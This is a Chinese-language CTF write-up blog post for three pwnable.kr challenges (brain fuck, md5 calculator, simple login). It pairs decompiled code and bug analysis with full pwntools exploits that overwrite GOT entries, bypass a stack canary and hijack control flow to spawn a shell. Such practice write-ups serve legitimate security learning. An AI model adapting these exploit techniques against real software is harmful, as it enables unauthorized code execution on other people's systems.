---
layout: post
title: Rookiss Writeup [pwnable.kr]
tags: [pwn, security]
---

（PS：文章内容会随着做题进度进行更新）

### [brain fuck]

> I made a simple brain-fuck language emulation program written in C.<br>
> The [ ] commands are not implemented yet. However the rest functionality seems working fine.<br>
> Find a bug and exploit it to get a shell. 
>
> Download : http://pwnable.kr/bin/bf<br>
> Download : http://pwnable.kr/bin/bf_libc.so
>
> Running at : nc pwnable.kr 9001

`bf` 为 32 位 ELF 程序：

![img](/images/articles/2015-07-25-rookiss-writeup-pwnable-kr/brain-fuck-1.png)

使用 IDA 分析，程序会让你输入一串字符（最多1024bytes）然后遍历字符进行解析：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@4
  int v4; // edx@4
  size_t i; // [sp+28h] [bp-40Ch]@1
  int v6; // [sp+2Ch] [bp-408h]@1
  int v7; // [sp+42Ch] [bp-8h]@1
	
  v7 = *MK_FP(__GS__, 20);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  p = (int)&tape;
  puts("welcome to brainfuck testing system!!");
  puts("type some brainfuck instructions except [ ]");
  memset(&v6, 0, 0x400u);
  fgets((char *)&v6, 1024, stdin);
  for ( i = 0; i < strlen((const char *)&v6); ++i )
    do_brainfuck(*((_BYTE *)&v6 + i));
  result = 0;
  v4 = *MK_FP(__GS__, 20) ^ v7;
  return result;
}
```
	
`do_brainfuck` 函数有一些列对指针 `p` 进行操作的分支：

```c
int __cdecl do_brainfuck(char a1)
{
  int result; // eax@1
  int v2; // ebx@7
	
  result = a1;
  switch ( a1 )
  {
    case '>':
      result = p++ + 1;
      break;
    case '<':
      result = p-- - 1;
      break;
    case '+':
      result = p;
      ++*(_BYTE *)p;
      break;
    case '-':
      result = p;
      --*(_BYTE *)p;
      break;
    case '.':
      result = putchar(*(_BYTE *)p);
      break;
    case ',':
      v2 = p;
      result = getchar();
      *(_BYTE *)v2 = result;
      break;
    case '[':
      result = puts("[ and ] not supported.");
      break;
    default:
      return result;
  }
  return result;
}
```
	
这里的指针 `p` 是一个字符型指针，每次自增或自减会使得指向的地址 `+0x1` 或 `-0x1`。根据分析可以得到如下解析说明：
    
    '>' ==> p++
    '<' ==> p--
    '+' ==> *p += 1
    '-' ==> *p -= 1
    '.' ==> putchar(*p)
    ',' ==> *p = getchar()
    '[' ==> puts(xxxx)
	
这里既能控制指针，又能读写指针指向地址的值，并且指针 `p` 初始值为 `0x0804A0A0 (tape)`，而往低地址一点就是 `.got.plt`。因为题目提供了 libc 文件，所以这里可以通过泄漏 `.got.plt` 中的 `fgets()` 函数地址来计算目标环境的 `system()` 函数地址，然后重写 `.got.plt` 结构来使得 `fgets()` 的 GOT 变为 `system()`，`memset()` 的 GOT 变为 `gets()`，然后通过修改 `putchar()` 的 GOT 为主函数 `main()`，从而执行到 `0x08048700 - 0x08048734` 处代码的时候实际上执行的是 `system(gets())`：
    
    .text:08048700                 mov     dword ptr [esp+8], 400h ; n
    .text:08048708                 mov     dword ptr [esp+4], 0 ; c
    .text:08048710                 lea     eax, [esp+2Ch]
    .text:08048714                 mov     [esp], eax      ; s
    .text:08048717                 call    _memset         ; rewrite memset() to fgets()
    .text:0804871C                 mov     eax, ds:stdin@@GLIBC_2_0
    .text:08048721                 mov     [esp+8], eax    ; stream
    .text:08048725                 mov     dword ptr [esp+4], 400h ; n
    .text:0804872D                 lea     eax, [esp+2Ch]
    .text:08048731                 mov     [esp], eax      ; s
    .text:08048734                 call    _fgets          ; rewrite fgets() to system()
    .text:08048739                 mov     dword ptr [esp+28h], 0
    .text:08048741                 jmp     short loc_8048760
	
最终的 exp 如下：

```python
#!/usr/bin/env python
# coding: utf-8

from pwn import *

# Remote EXP
libc = ELF('./bf_libc.so')
p = remote('pwnable.kr', 9001)

# Local EXP
# libc = ELF('./libc.so.6')
# p = process('./bf')


p.recvline_startswith('type')

# Move the pointer to .got.plt fgets()
payload = '<' * (0x0804A0A0 - 0x0804A010)
# Print .got.plt fgets() address in memory each bytes
payload += '.>' * 4
# reMove the pointer to .got.plt fgets()
payload += '<' * 4
# Write .got.plt fgets() to system()
payload += ',>' * 4
# Move the pointer to .got.plt memset()
payload += '>' * (0x0804A02C - 0x0804A014)
# Write .got.plt memset() to fgets()
payload += ',>' * 4
# Writr .got.plt putchar() to main() 0x08048671
payload += ',>' * 4
# Call putchar(), actually main() called
payload += '.'

p.sendline(payload)

fgets_addr = p.recvn(4)[::-1].encode('hex')
system_addr = int(fgets_addr, 16) - libc.symbols['fgets'] + libc.symbols['system']
gets_addr = int(fgets_addr, 16) - libc.symbols['fgets'] + libc.symbols['gets']

p.send(p32(system_addr))
p.send(p32(gets_addr))
p.send(p32(0x08048671))
p.sendline('/bin/sh')
p.interactive()
```
	
### [md5 calculator]

> We made a simple MD5 calculator as a network service.<br>
> Find a bug and exploit it to get a shell.
>
> Download : http://pwnable.kr/bin/hash<br>
> hint : this service shares the same machine with pwnable.kr web service
>
> Running at : nc pwnable.kr 9002

`hash` 为 32 位 ELF 程序，并且开启了 `CANARY` 和 `NX`：

![img](/images/articles/2015-07-25-rookiss-writeup-pwnable-kr/md5-calculator-1.png)

程序逻辑首先是通过一个随机 HASH 值验证，然后让你输入一串 Base64 编码的字符串，程序对 Base64 解码后的字符串计算 MD5 值并输出：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax@1
  int v5; // [sp+18h] [bp-8h]@1
  int v6; // [sp+1Ch] [bp-4h]@1

  setvbuf(stdout, 0, 1, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("- Welcome to the free MD5 calculating service -");
  v3 = time(0);
  srand(v3);
  v6 = my_hash();
  printf("Are you human? input captcha : %d\n", v6);
  __isoc99_scanf("%d", &v5);
  if ( v6 != v5 )
  {
    puts("wrong captcha!");
    exit(0);
  }
  puts("Welcome! you are authenticated.");
  puts("Encode your data with BASE64 then paste me!");
  process_hash();
  puts("Thank you for using our service.");
  system("echo `date` >> log");
  return 0;
}
```

通过分析代码可以知道，在输入 Base64 字符串时程序可接收 1024bytes（原始字符串长度 768bytes），但是在 `process_hash` 函数处理中保存解码后的缓冲区空间只有 512bytes：
    
处理输入：

    .text:08048FE0                 mov     eax, ds:stdin@@GLIBC_2_0
    .text:08048FE5                 mov     [esp+8], eax    ; stream
    .text:08048FE9                 mov     dword ptr [esp+4], 400h ; n Base64 编码后的字符串 1024bytes，原始字符串长度最大为 768bytes (1024 * 3 / 4)
    .text:08048FF1                 mov     dword ptr [esp], offset g_buf ; s
    .text:08048FF8                 call    _fgets

Base64 解码处理：

    .text:08049015                 lea     eax, [ebp+var_20C]
    .text:0804901B                 mov     [esp+4], eax
    .text:0804901F                 mov     dword ptr [esp], offset g_buf
    .text:08049026                 call    Base64Decode

（由于开启了 `CANARY`，`[ebp+0xc]` 存储的是 CANARY 值，`0x20c - 0xc = 512` 字节）

这里 768 字节的可输入长度（经 Base64 解码后）超过了可存储缓冲区的 512 字节，形成溢出。但由于 `CANARY` 的存在必须要知道准确的 CANARY 值才能够溢出后成功返回控制 PC 指针。

由于 CANARY 值在程序初始化载入运行之前就已经生成，并且在 `my_hash` 产生的 HASH 验证值也使用了 CANARY，并且 8 次 `rand()` 调用的随机种子为当前的时间值（main() 中已经设置）：

```c
int my_hash()
{
  int result; // eax@4
  int v1; // edx@4
  signed int i; // [sp+0h] [bp-38h]@1
  int nums[8]; // [sp+Ch] [bp-2Ch]@2
  int v4; // [sp+2Ch] [bp-Ch]@1

  v4 = *MK_FP(__GS__, 20);
  for ( i = 0; i <= 7; ++i )
    nums[i] = rand();
  result = nums[4] - nums[6] + nums[7] + v4 + nums[2] - nums[3] + nums[1] + nums[5];
  v1 = *MK_FP(__GS__, 20) ^ v4;
  return result;
}
```

因此可以使用得到的 `Capcha` 值和当前时间反推 CANARY 值：

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[]) {
    int t = atoi(argv[1]);
    int c = atoi(argv[2]);
    int canary = 0;
    int nums[8];

    srand(t);
    int i = 0;
    for(;i <= 7; i++) {
        nums[i] = rand();
    }
    // c = nums[1] + nums[5] + nums[2] - nums[3] + nums[7] + canary + nums[4] - nums[6]
    canary = c - nums[1] - nums[5] - nums[2] + nums[3] - nums[7] - nums[4] + nums[6];
    printf("%x\n", canary);

    return 0;
}
```

最终构造的 Payload 结构就该为：

    ['A' * 512]-[CANARY]-['A' * 12]-[plt_system]-[0]-[p("/bin/sh")]
    
    512bytes + 4bytes + 12bytes + 4bytes + 4bytes + 4bytes = 540bytes
    
    Base64([540bytes]) ==> 720bytes

因为输入的 Base64 字符串存于 `.bss` 段 `0x0804B0E0` 处，所以可以将 `/bin/sh` 字节添加到输入的字符串后面，结合 Payload 的结构将其写到 `0x0804B0E0 + 720` 处，最终 exp 如下：

```python
#!/usr/bin/env python
# coding: utf-8

import os
import re
import time
import random
import urllib2

from pwn import *

# elf = ELF('./hash')
# plt_system = elf.plt['system']
plt_system = 0x08048880

# Local EXP
t = int(time.time())
# p = process('./hash')

# Remote EXP
# date = urllib2.urlopen('http://pwnable.kr').headers['Date']
# t = int(time.mktime(time.strptime(date, '%a, %d %b %Y  %H:%M:%S %Z')))
# t += random.randint(0, 3)
p = remote('127.0.0.1', 9002)

capcha = re.search(r'(-?[\d]+)', p.recvline_regex(r'(-?[\d]{5,})')).group(0)
p.sendline(capcha)

canary = '0x' + os.popen('./hashc {} {}'.format(str(t), capcha)).read()
canary = int(canary, 16)

payload = 'A' * 512 + p32(canary) + 'A' * 12 + p32(plt_system) + p32(0x8048a00) + p32(0x0804B0E0 + 540*4/3)

p.sendline(b64e(payload) + '/bin/sh\0')
p.interactive()
```

### [simple login]

> Can you get authentication from this server?
>
> Download : http://pwnable.kr/bin/login
>
> Running at : nc pwnable.kr 9003

`login` 为 32 位 ELF 程序，简单使用 IDA 分析程序，可以得到主要程序逻辑：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v3; // ST04_1@1
  int v5; // [sp+18h] [bp-28h]@1
  __int16 v6; // [sp+1Eh] [bp-22h]@1
  unsigned int v7; // [sp+3Ch] [bp-4h]@1

  memset(&v6, 0, 0x1Eu);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  printf("Authenticate : ", v3);
  _isoc99_scanf("%30s", (unsigned int)&v6);
  memset(&input, 0, 0xCu);
  v5 = 0;
  v7 = Base64Decode(&v6, &v5);
  if ( v7 > 0xC )
  {
    puts("Wrong Length");
  }
  else
  {
    memcpy(&input, v5, v7);
    if ( auth(v7) == 1 )
      correct();
  }
  return 0;
}
```

这里经过 `Base64Decode()` 函数解码后字符串长度不能超过 12bytes，而在 `auth()` 函数中通过 `memcpy()` 函数将解码后的字符串复制到自己的函数堆栈中：

    .text:080492A2                 mov     eax, [ebp+arg_0]
    .text:080492A5                 mov     [esp+8], eax    ; i_buf_length (max=0xc)
    .text:080492A9                 mov     dword ptr [esp+4], offset input ; base64 decode string
    .text:080492B1                 lea     eax, [ebp+var_14]
    .text:080492B4                 add     eax, 0Ch        ; [ebp-0x8] buff[8]
    .text:080492B7                 mov     [esp], eax
    .text:080492BA                 call    memcpy          ; memcpy(&(ebp-0x8), &b64d_str, 0xc)
    
这里可以看到 `auth()` 函数中只使用了 8bytes 来存储 Base64 解码后的字符串，而允许的解码后的字符串长度为 12bytes，溢出的 4bytes 刚好覆盖了 `ebp` 的值，在 `auth()` 函数返回执行 `leave; ret` 从而可以控制程序流程，因为输入字符串和解码后的字符串都存在了 `.bss 0x0811EB40` 地址上，所以直接覆盖 `ebp` 值为 `input` 变量的地址，并在 `0x0811EB40 + 4` 处写入需要 RET 的地址即可。

程序中已经准备好了 `system("/bin/sh")`，所以直接将返回地址控制到该处即可，最终 exp 如下：

```python
#!/usr/bin/env python
# coding: utf-8

from pwn import *

p = process('./login')

ebp_over = 0x0811EB40  # input .bss
pp_system = 0x08049284 # system("/bin/sh")
payload = b64e('A' * 4 + p32(pp_system) + p32(ebp_over))

p.sendline(payload)
p.interactive()
```